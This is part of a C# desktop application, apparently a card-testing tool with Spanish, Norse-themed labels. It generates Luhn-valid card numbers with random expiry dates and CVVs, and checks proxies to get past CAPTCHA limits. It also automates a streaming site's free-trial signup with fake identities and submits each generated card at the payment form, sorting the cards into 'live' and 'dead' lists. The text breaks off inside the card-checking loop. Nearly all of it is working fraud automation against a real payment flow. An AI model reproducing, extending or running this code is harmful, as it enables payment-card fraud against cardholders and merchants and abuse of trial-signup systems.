            Rectangle borderTextBoxHelheim = new Rectangle(TextBoxHelheim.Location.X, TextBoxHelheim.Location.Y, TextBoxHelheim.ClientSize.Width + 17, TextBoxHelheim.ClientSize.Height);
            borderTextBoxHelheim.Inflate(1, 1); // border thickness
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxHelheim, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion
        #region Contols Events
        private void TextBoxHelheim_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            try
            {
                LabelCountHellheim.Text = textBox.Lines.Count().ToString();
            }
            catch (Exception) { /*throw;*/ }
        }
        private void IconButtonClear_Click(object sender, EventArgs e)
        {
            IconButton iconButton = (IconButton)sender;
            iconButton.IconColor = Color.Black;
            iconButton.Enabled = false;
            TextBoxBin.Clear();
            TextBoxBin.Placeholder("######xxxxxxxxxx");
            MaskedTextBoxDate.Clear();
            MaskedTextBoxDate.Placeholder("dd/aa");
            TextBoxCvv.Clear();
            TextBoxCvv.Placeholder(cvvDigits);
            TextBoxQuantity.Clear();
            TextBoxQuantity.Text = "10";
            TextBoxCreditCards.Text = string.Empty;
            TextBoxValhalla.Text = string.Empty;
            TextBoxHelheim.Text = string.Empty;
            IconButtonGenerar.IconColor = Color.Black;
            IconButtonGenerar.Enabled = false;
            IconButtonVerify.IconColor = Color.Black;
            IconButtonVerify.Enabled = false;
            LabelGetBin.Text = "-";
            LabelGetSchema.Text = "-";
            LabelGetType.Text = "-";
            LabelGetBrand.Text = "-";
            LabelGetBank.Text = "-";
            LabelGetCountry.Text = "-";
        }
        #endregion
        #endregion
        #endregion

        #region Generator Credit Cards
        #region Methods
        private async Task GenerateCreditCards()
        {
            tokenCancel = new CancellationTokenSource();
            CancellationToken token = tokenCancel.Token;

            //  await Task.Factory.StartNew(async () =>
            await Task.Run(async () =>
            {
                if (!token.IsCancellationRequested)
                {
                    string bin = TextBoxBin.Text.Replace("x", string.Empty).Replace("X", string.Empty);
                    string listCreditCard = string.Empty;
                    if (bin.Length >= 6)
                    {
                        Dictionary<int, int> precision = new Dictionary<int, int>();
                        RangeAndLength[] range = AllCards();
                        int rangeLength = range.Length;
                        for (int j = 0; j < rangeLength; j++)
                        {
                            string pattern = @"\b" + range[j].Range;
                            Match match = Regex.Match(bin, pattern);
                            if (match.Success)
                            {
                                precision.Add(j, int.Parse(match.Value));
                            }
                        }
                        if (precision.Count > 0)
                        {
                            RangeAndLength card = range[precision.OrderByDescending(x => x.Value).First().Key];
                            int cardLenght = card.Length;
                            Quatity = TextBoxQuantity.Text;
                            int quantity = int.Parse(Quatity);
                            CreditCards = new List<List<string>>();
                            for (int i = 0; i < quantity; i++)
                            {
                                double progress = Convert.ToDouble((i + 1) * 100 / quantity);
                                await ConsoleProgressGeneral("Generando", (int)Math.Round(progress));
                                CreditCards.Add(new List<string>());
                                CreditCards[i].Add(CreateCardNumber(bin, cardLenght));
                                CreditCards[i].Add(GetDate()[0]);
                                CreditCards[i].Add(GetDate()[1]);
                                CreditCards[i].Add(GetCvv());
                                //await Task.Delay(50);
                                if (IconButtonGenerarStopClick)
                                {
                                    IconButtonGenerarStopClick = false;
                                    await ConsoleProgressGeneral("¡Detenido!", 0, "Success");
                                    break;
                                }
                            }

                            if (CreditCards.Count > 0)
                            {
                                int creditCardsCount = CreditCards.Count;
                                for (int i = 0; i < creditCardsCount; i++)
                                {
                                    if (i != creditCardsCount - 1)
                                    {
                                        listCreditCard += string.Join("|", CreditCards[i].ToArray()) + "\r\n";
                                    }
                                    else
                                    {
                                        listCreditCard += string.Join("|", CreditCards[i].ToArray());
                                    }
                                }
                            }
                        }
                    }
                    TextBoxCreditCards.Text = listCreditCard;
                }
            }, token);
        }
        private static RangeAndLength[] AllCards()
        {
            return BuildRangeAndLengthList(rangeAmex, 15).
                Union(BuildRangeAndLengthList(rangeCUP, 16)).
                Union(BuildRangeAndLengthList(rangeDCCB, 14)).
                Union(BuildRangeAndLengthList(rangeDCI, 14)).
                Union(BuildRangeAndLengthList(rangeDCUSC, 16)).
                Union(BuildRangeAndLengthList(rangeDC, 14)).
                Union(BuildRangeAndLengthList(rangeInsP, 16)).
                Union(BuildRangeAndLengthList(rangeIntP, 16)).
                Union(BuildRangeAndLengthList(rangeJCB, 16)).
                Union(BuildRangeAndLengthList(rangeM, 16)).
                Union(BuildRangeAndLengthList(rangeMC, 16)).
                Union(BuildRangeAndLengthList(rangeUATP, 15)).
                Union(BuildRangeAndLengthList(rangeV, 16)).
                ToArray();
        }
        private static IEnumerable<RangeAndLength> BuildRangeAndLengthList(string[] rangeList, int length)
        {
            string[] x = GenerateRange(rangeList);
            return from range in x select new RangeAndLength(range, length);
        }
        private static string[] GenerateRange(string[] rangesList)
        {
            List<string> range = new List<string>();
            foreach (string rangeList in rangesList)
            {
                if (rangeList.Contains("-"))
                {
                    string[] ranges = rangeList.Split('-');
                    int start = int.Parse(ranges[0]);
                    int end = int.Parse(ranges[1]);

                    for (int i = start; i <= end; i++)
                    {
                        range.Add(i.ToString());
                    }
                }
                else
                {
                    range.Add(rangeList);
                }
            }
            return range.ToArray();
        }
        private struct RangeAndLength
        {
            public RangeAndLength(string range, int length)
            {
                Range = range;
                Length = length;
            }
            public string Range { get; set; }
            public int Length { get; set; }
        }
        private string CreateCardNumber(string bin, int binLenght)
        {
            Random random = new Random();
            string ccnumber = bin;
            while (ccnumber.Length < (binLenght - 1))
            {
                double rnd = (random.NextDouble() * 1.0f - 0f);
                ccnumber += Math.Floor(rnd * 10);
            }

            // reverse number and convert to int
            IEnumerable<char> reversedCCnumberstring = ccnumber.ToCharArray().Reverse();
            IEnumerable<int> reversedCCnumberList = reversedCCnumberstring.Select(c => Convert.ToInt32(c.ToString()));

            // calculate sum //Luhn Algorithm http://en.wikipedia.org/wiki/Luhn_algorithm
            int sum = 0;
            int pos = 0;
            int[] reversedCCnumber = reversedCCnumberList.ToArray();

            while (pos < binLenght - 1)
            {
                int odd = reversedCCnumber[pos] * 2;

                if (odd > 9)
                    odd -= 9;

                sum += odd;

                if (pos != (binLenght - 2))
                    sum += reversedCCnumber[pos + 1];

                pos += 2;
            }

            // calculate check digit
            int checkdigit = Convert.ToInt32((Math.Floor((decimal)sum / 10) + 1) * 10 - sum) % 10;
            ccnumber += checkdigit;
            return ccnumber;
        }
        private List<string> GetDate()
        {
            List<string> date = new List<string>();
            if (MaskedTextBoxDate.Text != "dd/aa")
            {
                string[] split = MaskedTextBoxDate.Text.Split('/');
                date.Add(split[0]);
                date.Add("20" + split[1]);
            }
            else
            {
                date.Add(new Random().Next(1, 12).ToString("00"));
                date.Add("20" + new Random().Next(20, 29).ToString());
            }
            return date;
        }
        private string GetCvv()
        {
            string cvv;
            if (TextBoxCvv.Text == cvvDigits)
            {
                if (TextBoxCvv.MaxLength == 4)
                {
                    cvv = new Random().Next(1, 9999).ToString("0000");
                }
                else
                {
                    cvv = new Random().Next(1, 999).ToString("000");
                }
            }
            else
            {
                cvv = TextBoxCvv.Text;
            }
            return cvv;
        }

        #endregion
        #endregion

        #region Valkyrie
        #region Panel Valkyrie
        #region Panel Events
        private void PanelValkyrie_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxValkyrie = new Rectangle(TextBoxValkyrie.Location.X, TextBoxValkyrie.Location.Y, TextBoxValkyrie.ClientSize.Width + 17, TextBoxValkyrie.ClientSize.Height);
            borderTextBoxValkyrie.Inflate(1, 1); // border thickness
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValkyrie, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion
        #region Contols Events
        private void TextBoxValkyrie_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            try
            {
                LabelCountValkyrie.Text = textBox.Lines.Count().ToString();
                string valkyries = textBox.Text.Trim();
                if (ModifierKeys.HasFlag(Keys.Control))
                {
                    if (valkyries.Contains("\r\n"))
                    {
                        string[] listValkyries = valkyries.Split(new string[] { "\r\n" }, StringSplitOptions.None);
                        int listValkyriesLength = listValkyries.Length;
                        Valkyries = new List<List<string>>();
                        for (int i = 0; i < listValkyriesLength; i++)
                        {
                            string[] listValkyrie = listValkyries[i].Split('|');
                            Valkyries.Add(new List<string>());
                            Valkyries[i].Add(listValkyrie[0]);
                            Valkyries[i].Add(listValkyrie[1]);
                            Valkyries[i].Add(listValkyrie[2]);
                        }
                        if (!IconButtonValkyrieVerifyClick)
                        {
                            IconButtonValkyrieVerify.IconColor = Color.Black;
                            IconButtonValkyrieVerify.Enabled = true;
                            IconButtonValkyrieClear.IconColor = Color.Black;
                            IconButtonValkyrieClear.Enabled = true;
                        }
                    }
                    else if (valkyries.Contains("|"))
                    {
                        Valkyries = new List<List<string>>();
                        string[] listValkyrie = valkyries.Split('|');
                        Valkyries.Add(new List<string>());
                        Valkyries[0].Add(listValkyrie[0]);
                        Valkyries[0].Add(listValkyrie[1]);
                        Valkyries[0].Add(listValkyrie[2]);
                        if (!IconButtonValkyrieVerifyClick)
                        {
                            IconButtonValkyrieVerify.IconColor = Color.Black;
                            IconButtonValkyrieVerify.Enabled = true;
                            IconButtonValkyrieClear.IconColor = Color.Black;
                            IconButtonValkyrieClear.Enabled = true;
                        }
                    }
                    else
                    {
                        textBox.Text = string.Empty;
                    }
                }
                else
                {
                    if (valkyries == string.Empty)
                    {
                        textBox.Text = string.Empty;
                        IconButtonVerify.IconColor = Color.Black;
                        IconButtonVerify.Enabled = false;
                        if (TextBoxValkyrieLive.Text == string.Empty && TextBoxValkyrieDie.Text == string.Empty)
                        {
                            IconButtonClear.IconColor = Color.Black;
                            IconButtonClear.Enabled = false;
                        }
                    }
                }
            }
            catch (Exception)
            {
                textBox.Text = string.Empty;
            }
        }
        private async void IconButtonValkyrieVerify_Click(object sender, EventArgs e)
        {
            IconButton iconButton = (IconButton)sender;
            iconButton.IconColor = Color.Black;
            iconButton.Enabled = false;
            IconButtonValkyrieStart.IconColor = Color.Black;
            IconButtonValkyrieStart.Enabled = false;
            IconButtonValkyrieClear.IconColor = Color.Black;
            IconButtonValkyrieClear.Enabled = false;
            IconButtonValkyrie.IconColor = Color.Black;
            IconButtonValkyrie.Enabled = false;
            IconButtonValkyrieVerifyClick = true;
            IconButtonValkyrieStop.Enabled = true;
            IconButtonValkyrieStop.IconColor = Color.Black;
            IconButtonValkyrieStop.Show();
            await InvokeValkyrie();
            await ConsoleProgressGeneral("Finalizo llamado a Valquirias.", 100, "Success");
            await ConsoleProgressDetail("Finalizo llamado a Valquirias.", 100, "Success");
            await ConsoleProgressGeneral("VALQUIRIAS (PROXYS).", 0);
            await ConsoleProgressDetail("VALQUIRIAS (PROXYS).", 0);
            IconButtonValkyrieClear.IconColor = Color.Black;
            IconButtonValkyrieClear.Enabled = true;
            if (!string.IsNullOrEmpty(TextBoxValkyrieLive.Text))
            {
                if (TextBoxValkyrieLive.Lines.Count() > 0)
                {
                    IconButtonValkyrieStart.IconColor = Color.Black;
                    IconButtonValkyrieStart.Enabled = true;
                    IconButtonValkyrie.IconColor = Color.Black;
                    IconButtonValkyrie.Enabled = true;
                }
            }
            IconButtonValkyrieVerifyClick = false;
            IconButtonValkyrieStop.Hide();
        }
        #endregion
        #endregion
        #region Panel Valkyrie Live
        #region Panel events
        private void PanelValkyrieLive_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxValkyrieLive = new Rectangle(TextBoxValkyrieLive.Location.X, TextBoxValkyrieLive.Location.Y, TextBoxValkyrieLive.ClientSize.Width + 17, TextBoxValkyrieLive.ClientSize.Height);
            borderTextBoxValkyrieLive.Inflate(1, 1); // border thickness
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValkyrieLive, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion
        #region Controls Events
        private void TextBoxValkyrieLive_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            LabelCountValkyrieLive.Text = textBox.Lines.Count().ToString();
            Valkyrie.Play();
        }
        private void IconButtonValkyrieStart_Click(object sender, EventArgs e)
        {
            try
            {
                IconButton iconButton = (IconButton)sender;
                iconButton.IconColor = Color.Black;
                iconButton.Enabled = false;
                string valkyries = TextBoxValkyrieLive.Text.Trim();
                if (valkyries.Contains("\r\n"))
                {
                    string[] listValkyries = valkyries.Split(new string[] { "\r\n" }, StringSplitOptions.None);
                    int listValkyriesLength = listValkyries.Length;
                    LiveValkyries = new List<List<string>>();
                    for (int i = 0; i < listValkyriesLength; i++)
                    {
                        string[] listValkyrie = listValkyries[i].Split('|');
                        LiveValkyries.Add(new List<string>());
                        LiveValkyries[i].Add(listValkyrie[0] + "://" + listValkyrie[1] + ":" + listValkyrie[2]);
                    }
                }
                else if (valkyries.Contains("|"))
                {
                    LiveValkyries = new List<List<string>>();
                    string[] listValkyrie = valkyries.Split('|');
                    LiveValkyries.Add(new List<string>());
                    LiveValkyries[0].Add(listValkyrie[0] + "://" + listValkyrie[1] + ":" + listValkyrie[2]);
                }

            }
            catch (Exception) { }
            IconButtonGenerar.IconColor = IconButtonGenerarIconColor;
            IconButtonGenerar.Enabled = IconButtonGenerarEnabled;
            PanelValkyrie.Hide();
            PanelValkyrieLive.Hide();
            PanelValkyrieDie.Hide();
            ShowPanelValkyrie = false;
        }
        private async void IconButtonValkyrieStop_Click(object sender, EventArgs e)
        {
            try
            {
                //if (tokenCancel != null)
                //{
                IconButton iconbutton = (IconButton)sender;
                iconbutton.IconColor = Color.Black;
                iconbutton.Enabled = false;
                await browser.Kill("www.gaia.com");
                await tokenCancel.Kill();
                //tokenCancel.Cancel();
                //tokenCancel.Dispose();
                //tokenCancel = null;
                await ConsoleProgressGeneral("¡Detenido!", 0, "Success");
                await ConsoleProgressDetail("¡Detenido!", 0, "Success");
                await ConsoleProgressGeneral("VALQUIRIAS (PROXYS)", 0);
                await ConsoleProgressDetail("VALQUIRIAS (PROXYS)", 0);
                IconButtonValkyrieClear.IconColor = Color.Black;
                IconButtonValkyrieClear.Enabled = true;
                IconButtonValkyrie.IconColor = Color.Black;
                IconButtonValkyrie.Enabled = true;
                if (Valkyries.Count > 0)
                {
                    IconButtonValkyrieVerify.IconColor = Color.Black;
                    IconButtonValkyrieVerify.Enabled = true;
                }

                if (!string.IsNullOrEmpty(TextBoxValkyrieLive.Text))
                {
                    if (TextBoxValkyrieLive.Lines.Count() > 0)
                    {
                        IconButtonValkyrieStart.IconColor = Color.Black;
                        IconButtonValkyrieStart.Enabled = true;
                        IconButtonValkyrie.IconColor = Color.Black;
                        IconButtonValkyrie.Enabled = true;
                    }
                }
                iconbutton.Hide();
                //}
            }
            catch (Exception) { }
        }
        #endregion
        #endregion
        #region Panel Valkyrie Die
        #region Panel events
        private void PanelValkyrieDie_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxValkyrieDie = new Rectangle(TextBoxValkyrieDie.Location.X, TextBoxValkyrieDie.Location.Y, TextBoxValkyrieDie.ClientSize.Width + 17, TextBoxValkyrieDie.ClientSize.Height);
            borderTextBoxValkyrieDie.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValkyrieDie, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion

        #region Controls Events
        private void TextBoxValkyrieDie_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            LabelCountValkyrieDie.Text = textBox.Lines.Count().ToString();
        }
        private void IconButtonValkyrieClear_Click(object sender, EventArgs e)
        {
            IconButton iconButton = (IconButton)sender;
            iconButton.IconColor = Color.Black;
            iconButton.Enabled = false;
            IconButtonValkyrieVerify.IconColor = Color.Black;
            IconButtonValkyrieVerify.Enabled = false;
            IconButtonValkyrieStart.IconColor = Color.Black;
            IconButtonValkyrieStart.Enabled = false;
            TextBoxValkyrie.Text = string.Empty;
            TextBoxValkyrieLive.Text = string.Empty;
            TextBoxValkyrieDie.Text = string.Empty;
            if (Valkyries != null)
            {
                if (Valkyries.Count > 0)
                {
                    Valkyries.Clear();
                }
            }

            if (LiveValkyries != null)
            {
                if (LiveValkyries.Count > 0)
                {
                    LiveValkyries.Clear();
                }
            }
            IconButtonValkyrieVerifyClick = false;
        }
        #endregion
        #endregion
        #region Methods
        private async Task InvokeValkyrie()
        {
            try
            {
                string listValkyrieLive = string.Empty;
                string listValkyrieDie = string.Empty;
                int valkyriesCount = Valkyries.Count;
                await ConsoleProgressGeneral("Thor hace llamado a Valquirias.", 0);
                int x = 0;
                for (int i = 0; i < valkyriesCount;)
                {
                    double progress = Convert.ToDouble((x + 1) * 100 / valkyriesCount);
                    await ConsoleProgressGeneral("Thor hace llamado a Valquirias.", (int)Math.Round(progress));
                    string proxy = Valkyries[i][0] + "://" + Valkyries[i][1] + ":" + Valkyries[i][2];
                    bool thorVerifyValkyrie = await ThorVerifyValkyrie(proxy);
                    if (thorVerifyValkyrie)
                    {
                        if (TextBoxValkyrieLive.Text == string.Empty)
                        {
                            listValkyrieLive += string.Join("|", Valkyries[i].ToArray());
                        }
                        else
                        {
                            listValkyrieLive = TextBoxValkyrieLive.Text;
                            listValkyrieLive += "\r\n" + string.Join("|", Valkyries[i].ToArray());
                        }
                        await ReduceListValkyrie();
                        TextBoxValkyrieLive.Text = listValkyrieLive;
                    }
                    else
                    {
                        if (TextBoxValkyrieDie.Text == string.Empty)
                        {
                            listValkyrieDie += string.Join("|", Valkyries[i].ToArray());
                        }
                        else
                        {
                            listValkyrieDie = TextBoxValkyrieDie.Text;
                            listValkyrieDie += "\r\n" + string.Join("|", Valkyries[i].ToArray());
                        }
                        await ReduceListValkyrie();
                        TextBoxValkyrieDie.Text = listValkyrieDie;
                    }
                    x++;
                }
            }
            catch (Exception) { }
        }
        private async Task<bool> ThorVerifyValkyrie(string proxy)
        {
            bool thor = false;
            try
            {
                //await ConsoleProgressDetail("Thor hace llamado a Valkirias.", 0);
                browser = new ChromiumWebBrowser();
                await Task.Delay(500);
                tokenCancel = new CancellationTokenSource();
                CancellationToken token = tokenCancel.Token;
                await ConsoleProgressDetail("Freyja lider de las Valkirias se prepara.", 0);
                await Task.Run(async () =>
                {
                    await ConsoleProgressDetail("Freyja lider de las Valkirias se prepara.", 50);
                    if (!token.IsCancellationRequested)
                    {
                        bool loadPage = await browser.LoadPage(initialUrl, proxy);
                        await ConsoleProgressDetail("Freyja hace llamado a Valkiria: " + proxy, 80);
                        await Task.Delay(500);
                        if (loadPage)
                        {
                            bool startThor = await StartThor(true);
                            if (startThor)
                            {
                                await ConsoleProgressDetail("Respondio llamado Valkiria: " + proxy, 100, "Success");
                                thor = true;
                            }
                            else
                            {
                                await ConsoleProgressDetail("No hay respuesta de Valkiria: " + proxy, 100, "Fail");
                                thor = false;
                            }
                        }
                        else
                        {
                            await ThorVerifyValkyrie(proxy);
                        }
                    }
                    else
                    {
                        thor = false;
                    }
                }, token);
            }
            catch (Exception) { }
            return thor;
        }
        private async Task ReduceListValkyrie()
        {
            try
            {
                Valkyries.RemoveAt(0);
                string listValkyries = string.Empty;
                int ValkyriesCount = Valkyries.Count;
                for (int i = 0; i < ValkyriesCount; i++)
                {
                    if (Valkyries.Count > 0)
                    {
                        if (i < Valkyries.Count - 1)
                        {
                            listValkyries += string.Join("|", Valkyries[i].ToArray()) + "\r\n";
                        }
                        else
                        {
                            listValkyries += string.Join("|", Valkyries[i].ToArray());
                        }
                    }
                    else
                    {
                        listValkyries = string.Empty;
                    }
                    await Task.Delay(50);
                }
                TextBoxValkyrie.Text = listValkyries;
            }

            catch (Exception) { }
        }
        #endregion
        #endregion

        #region webBrowser
        private async Task InvokeThor()
        {
            bool thor = false;
            try
            {
                await ConsoleProgressGeneral("Invocando a Thor.", 0);
                browser = new ChromiumWebBrowser();
                await Task.Delay(500);

                tokenCancel = new CancellationTokenSource();
                CancellationToken token = tokenCancel.Token;


                thor = await Task<bool>.Run(async () =>
                {
                    if (!token.IsCancellationRequested)
                    {
                        return await LoadBrowser();
                    }
                    else
                    {
                        return false;
                    }
                }, token);
            }
            catch (Exception) { /*throw;*/ }

            await browser.Kill("www.gaia.com");
            await tokenCancel.Kill();

            if (thor)
            {
                await ConsoleProgressGeneral("Thor finalizo los procesos correctamente.", 100, "Success");
                IconButtonClear.IconColor = Color.White;
                IconButtonClear.Enabled = true;
                IconButtonValkyrie.IconColor = Color.White;
                IconButtonValkyrie.Enabled = true;
            }
            else
            {
                if (requiredValkyrie)
                {
                    await ConsoleProgressGeneral("Thor requiere el apoyo de Proxys.", 0, "Fail");
                    IconButtonGenerar.IconColor = IconButtonGenerarIconColor;
                    IconButtonGenerar.Enabled = IconButtonGenerarEnabled;
                    IconButtonClear.IconColor = Color.White;
                    IconButtonClear.Enabled = true;
                    IconButtonValkyrie.IconColor = Color.White;
                    IconButtonValkyrie.Enabled = true;
                    if (CreditCards != null)
                    {
                        if (CreditCards.Count > 0)
                        {
                            IconButtonVerify.IconColor = Color.White;
                            IconButtonVerify.Enabled = true;

                        }
                        else
                        {
                            TextBoxCreditCards.Clear();
                            IconButtonVerify.IconColor = Color.Black;
                            IconButtonVerify.Enabled = false;
                        }
                    }
                    requiredValkyrie = false;
                }
                else
                {
                    if (CreditCards.Count > 0)
                    {
                        await ConsoleProgressGeneral("Thor requiere un sacrificio.", 0, "Fail");
                        await ConsoleProgressGeneral("Ofreciendo un sacrificio a Thor.", 0, "Success");
                        await InvokeThor();
                    }
                    else
                    {
                        await ConsoleProgressGeneral("Thor encontro un elfo oscuro y se detuvo.", 0, "Fail");
                    }
                }

            }
            //await Task.Delay(2000);
            //await ConsoleProgressGeneral("THOR DIOS DEL TRUENO.", 0);
            //await ConsoleProgressDetail("", 0);
        }
        private async Task<bool> LoadBrowser()
        {
            bool loadBrowser = false;
            try
            {
                await ConsoleProgressGeneral("Invocando a Thor..", 2);
                string url = initialUrl;
                if (LiveValkyries != null)
                {
                    if (LiveValkyries.Count > 0)
                    {
                        List<string> proxy = LiveValkyries.OrderBy(x => Guid.NewGuid()).FirstOrDefault();
                        await ConsoleProgressGeneral("Valquiria: " + proxy[0], 2);
                        loadBrowser = await browser.LoadPage(url, proxy[0]);
                    }
                    else
                    {
                        loadBrowser = await browser.LoadPage(url);
                    }
                }
                else
                {
                    loadBrowser = await browser.LoadPage(url);
                }
            }
            catch (Exception) { }

            await Task.Delay(500);
            if (loadBrowser)
            {
                return await LoadPage();
            }
            await ConsoleProgressGeneral("Invocando a Thor.. ¡Fallo!", 2, "Fail");
            return false;

        }

        private async Task<bool> LoadPage()
        {

            try
            {
                await ConsoleProgressGeneral("Invocando a Thor...", 3);
                return await StartThor();
            }
            catch (Exception) { }

            await ConsoleProgressGeneral("Invocando a Thor... ¡Fallo!", 0, "Fail");
            return false;
        }

        private async Task<bool> StartThor(bool valkyrie = false)
        {
            try
            {
                if (!valkyrie)
                {
                    await browser.Screenshot("1.StartThor");
                    await ConsoleProgressGeneral("Reciclando hexadecimales.", 10);
                    await browser.DisableAlerts();
                }
            }
            catch (Exception) { /*throw;*/ }
            //#main-app > div > main > div > div > div > div.plan-grid-expanded__list-contatiner > div > ul.plan-grid-expanded__list.plan-grid-expanded__list--upper > li.plan-grid-expanded__item.plan-grid-expanded__item--first.plan-grid-expanded__item--first-en.plan-grid-expanded__item--en > div > a
            //bool anchorStartFreeTrial = await browser.ElementVisible("#main-app > div > main > div > div > div > div.plan-grid-expanded__list-contatiner > div > ul.plan-grid-expanded__list.plan-grid-expanded__list--upper > li.plan-grid-expanded__item.plan-grid-expanded__item--first.plan-grid-expanded__item--first-en.plan-grid-expanded__item--en > div > a", "1.ExceptionStartThor");
            bool anchorStartFreeTrial = await browser.ElementVisible("#main-app > div > main > div > div > div > div.plan-grid-v2 > div.plan-grid-v2__button-wrapper > a", "1.ExceptionStartThor");
            if (anchorStartFreeTrial)
            {
                if (valkyrie)
                {
                    return true;
                }
                return await StartFreeTrial();
            }
            if (!valkyrie)
            {
                await ConsoleProgressGeneral("Reciclando hexadecimales. !Fallo¡", 10, "fail");
                return false;
            }
            return false;
        }

        private async Task<bool> StartFreeTrial()
        {
            try
            {
                await browser.Screenshot("2.StartFreeTrial");
                await ConsoleProgressGeneral("Generando infraestructura imaginaria.", 20);
                await browser.DisableAlerts();
                //string clickStartFreeTrial = "document.querySelector('#main-app > div > main > div > div > div > div.plan-grid-expanded__list-contatiner > div > ul.plan-grid-expanded__list.plan-grid-expanded__list--upper > li.plan-grid-expanded__item.plan-grid-expanded__item--first.plan-grid-expanded__item--first-en.plan-grid-expanded__item--en > div > a').click();";
                string clickStartFreeTrial = "document.querySelector('#main-app > div > main > div > div > div > div.plan-grid-v2 > div.plan-grid-v2__button-wrapper > a').click();";
                await browser.ExecuteScript(clickStartFreeTrial);
            }
            catch (Exception) {/*throw;*/}
            //#main-app > div > main > div > div > div.cart-account-continue__contents > div.cart-account-continue__left-wrap > a
            bool anchorContinue = await browser.ElementVisible("#main-app > div > main > div > div > div.cart-account-continue__contents > div.cart-account-continue__left-wrap > a", "2.ExceptionStartFreeTrial");
            if (anchorContinue)
            {
                return await Continue();
            }
            await ConsoleProgressGeneral("Generando infraestructura imaginaria. !Fallo¡", 20, "fail");
            return false;
        }

        private async Task<bool> Continue()
        {
            try
            {
                await browser.Screenshot("3.Continue");
                await ConsoleProgressGeneral("Cotejando sinergias interdimensionales.", 30);
                string clickContinue = @"document.querySelector('#main-app > div > main > div > div > div.cart-account-continue__contents > div.cart-account-continue__left-wrap > a').click();";
                await browser.ExecuteScript(clickContinue);
            }
            catch (Exception) { }
            //#main-app > div > main > div > div > div.cart-account-create__wrapper > div.cart-account-create__left-wrap > h2
            bool headingCreateYourAccount = await browser.ElementVisible("#main-app > div > main > div > div > div.cart-account-create__wrapper > div.cart-account-create__left-wrap > h2", "3.ExceptionContinue");
            if (headingCreateYourAccount)
            {
                return await CreateYourAccount();
            }
            await ConsoleProgressGeneral("Cotejando sinergias interdimensionales. ¡Fallo!", 30, "fail");
            return false;
        }
        private async Task<bool> CreateYourAccount(bool repeatPassword = false)
        {
            try
            {
                await browser.Screenshot("4.CreateYourAccount");
                await ConsoleProgressGeneral("Simulando ejecución de programa.", 40);
                await browser.DisableAlerts();
                if (repeatPassword)
                {
                    await browser.Click("input[name = password]");
                    for (int i = 0; i < 11; i++)
                    {
                        await browser.SendKeyCode(0x08);
                    }
                    await browser.SendKeys("input[name=password]", Faker.Internet.Password(8, false, "\\W", "Aa1"));
                }
                else
                {
                    firstName = Faker.Name.FirstName();
                    lastName = Faker.Name.LastName();
                    await browser.SendKeys("input[name=firstName]", firstName);
                    await browser.SendKeys("input[name=lastName]", lastName);
                    await browser.SendKeys("input[name=email]", Faker.Internet.Email());
                    await browser.SendKeys("input[name=password]", Faker.Internet.Password(8, false, "\\W", "Aa1"));
                    await browser.Click("input[name=terms]");
                }

                //   await browser.Click("#main-app > div > main > div > div > div.cart-account-create__wrapper > div.cart-account-create__left-wrap > div > form > div.cart-account-create__submit-wrapper > button");
                await browser.Click("#main-app > div > main > div > div > div.cart-account-create__wrapper > div.cart-account-create__left-wrap > div > form > div.cart-account-create__submit-wrapper > button");
            }
            catch (Exception) { /*throw;*/ }

            bool anchorCardMethod = await browser.ElementVisible("#main-app > div > main > div > div > div.cart-choose-payment__content > div.cart-choose-payment__show > div > a.cart-choose-payment__card-method", "4.ExceptionCreateYourAccount");
            if (anchorCardMethod)
            {
                return await CardMethod();
            }
            else
            {
                bool spanErrorPassword = await browser.ElementVisible("#main-app > div > main > div > div > div.cart-account-create__wrapper > div.cart-account-create__left-wrap > div > form > div.cart-account-create__fields-anonymous > div.form-password.form-password--error > span.form-password__error", "4.1.ExceptionCreateYourAccounPassword");
                if (spanErrorPassword)
                {
                    return await CreateYourAccount(true);
                }
            }

            await ConsoleProgressGeneral("Simulando ejecución de programa. ¡Fallo!", 40, "fail");
            return false;
        }

        private async Task<bool> CardMethod()
        {
            try
            {
                await browser.Screenshot("5.CardMethod");
                await ConsoleProgressGeneral("Identificando cálculos desviados.", 50);
                await browser.DisableAlerts();
                string clickStartCheckout = @"document.querySelector('#main-app > div > main > div > div > div.cart-choose-payment__content > div.cart-choose-payment__show > div > a.cart-choose-payment__card-method').click();";
                await browser.ExecuteScript(clickStartCheckout);
            }
            catch (Exception) {/* throw; */}

            bool headingPayment = await browser.ElementVisible("#z_hppm_iframe", "5.ExceptionCardMethod");
            if (headingPayment)
            {
                return await Last();
            }
            else
            {
                bool divCaptcha = await browser.ElementInnerTextContent("div.zuora-credit-card__error-message", "CAPTCHA", "5.1.ExceptionCardMethodCaptcha");
                if (divCaptcha)
                {
                    requiredValkyrie = true;
                    return false;
                }
            }
            await ConsoleProgressGeneral("Identificando cálculos desviados. ¡Fallo!", 50, "Fail");
            return false;
        }
        private async Task<bool> Last()
        {
            firstTime = true;
            try
            {
                await browser.Screenshot("6.Last");
                await ConsoleProgressGeneral("Atenuando discontinuidades temporales.", 60);
                await browser.DisableAlerts();
                string listLiveCreditCard = string.Empty;
                string listDieCreditCard = string.Empty;

                if (CreditCards.Count > 0)
                {
                    LiveCreditCards = new List<List<string>>();
                    DieCreditCards = new List<List<string>>();
                    int creditCardsCount = CreditCards.Count;
                    double x = 60;
                    for (int i = 0; i < creditCardsCount;)
                    {
                        await ConsoleProgressDetail("Comprobando las comunicaciones del inframundo.", 0);
                        string number = CreditCards[i][0];
                        string month = CreditCards[i][1];
                        string year = CreditCards[i][2];
                        string cvv = CreditCards[i][3];

                        bool latestData = await Card(number, month, year, cvv);
                        if (latestData)
                        {
                            bool forseti = await Forseti();
                            if (forseti)
                            {
                                await browser.Screenshot("Valhalla_" + number);
                                await ConsoleProgressDetail(string.Join("|", CreditCards[i].ToArray()), 100);
                                if (TextBoxValhalla.Text == string.Empty)
                                {
